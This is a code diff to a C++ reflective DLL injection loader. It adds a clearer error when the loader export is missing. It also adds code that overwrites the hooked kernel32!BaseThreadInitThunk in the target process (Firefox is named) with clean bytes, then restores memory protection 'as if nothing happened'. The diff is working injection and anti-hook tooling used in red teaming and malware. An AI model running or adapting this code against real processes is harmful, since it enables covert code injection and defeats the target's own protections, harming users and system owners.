@@ -191,7 +191,8 @@ LPVOID WINAPI LoadRemoteLibraryR(HANDLE process, LPVOID myBuffer, DWORD size, LP
 			cout << "[LoadRemoveLibraryR] Reflective Loader offset " << reflectiveLoaderOffset << " / error code " << GetLastError() << '\n';
 			if (!reflectiveLoaderOffset)
 			{
-				std::cout << "[LoadRemoteLibraryR] ReflectiveLoader '" << procName << "' offset not found.\n";
+				std::cout << "[LoadRemoteLibraryR] ReflectiveLoader '" << procName << "' offset not found. Maybe your DLL file is non-compliant with Reflective DLL Injection. Please specify the DLL file with Reflective Loader contained.\n";
+				break;
 			}
 
 			random_device rd;
@@ -224,8 +225,45 @@ LPVOID WINAPI LoadRemoteLibraryR(HANDLE process, LPVOID myBuffer, DWORD size, LP
 			if (!state)
 				break;
 
+			// https://github.com/0vercl0k/ReflectiveDLLInjection/commit/64091afe663c3e86654c6c0232a515a4e4d5ea04
+			// Fix kernel32!BaseThreadInitThunk if hooked in the target process (Firefox does that).
+			// check if kernel32!BaseThreadInitThunk is patched in the target process...
+			LPVOID lpBaseThreadInitThunk = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "BaseThreadInitThunk");
+			DWORD oldProtect = 0;
+			if (lpBaseThreadInitThunk != NULL)
+			{
+				UCHAR CleanBytes[16];
+				SIZE_T szNumberRead = 0, szNumberWritten = 0;
+
+				// read our version of kernel32!BaseThreadInitThunk...
+				state = ReadProcessMemory(GetCurrentProcess(), lpBaseThreadInitThunk, CleanBytes, sizeof(CleanBytes), &szNumberRead);
+				cout << "[LoadRemoveLibraryR] Reading my BaseThreadInitThunk / error code " << GetLastError() << '\n';
+				if (!state)
+					break;
+
+				if (szNumberRead == sizeof(CleanBytes))
+				{
+					state = VirtualProtectEx(process, lpBaseThreadInitThunk, sizeof(CleanBytes), PAGE_EXECUTE_READWRITE, &oldProtect);
+					cout << "[LoadRemoveLibraryR] Making target process BaseThreadInitThunk writable / error code " << GetLastError() << '\n';
+					if (!state)
+						break;
+				}
+
+				state = WriteProcessMemory(process, lpBaseThreadInitThunk, CleanBytes, sizeof(CleanBytes), &szNumberWritten);
+				cout << "[LoadRemoveLibraryR] Writing my BaseThreadInitThunk to target process / error code " << GetLastError() << '\n';
+				if (!state)
+					break;
+
+				if (szNumberWritten == sizeof(CleanBytes))
+				{
+					state = VirtualProtectEx(process, lpBaseThreadInitThunk, sizeof(CleanBytes), oldProtect, &oldProtect);
+					cout << "[LoadRemoveLibraryR] Re-protecting target process BaseThreadInitThunk as if nothing happened / error code " << GetLastError() << '\n';
+					if (!state)
+						break;
+				}
+			}
+
 			//https://github.com/rapid7/ReflectiveDLLInjection/commit/31c8f04046833b5e9b9d9bb4fc3e5d2f747af509
-			DWORD oldProtect;
 			state = VirtualProtectEx(process, buffer, size, PAGE_EXECUTE_READ, &oldProtect);
 			cout << "[LoadRemoveLibraryR] Changed page protect mode -> RX to execute / error code " << GetLastError() << '\n';
 			if (!state)
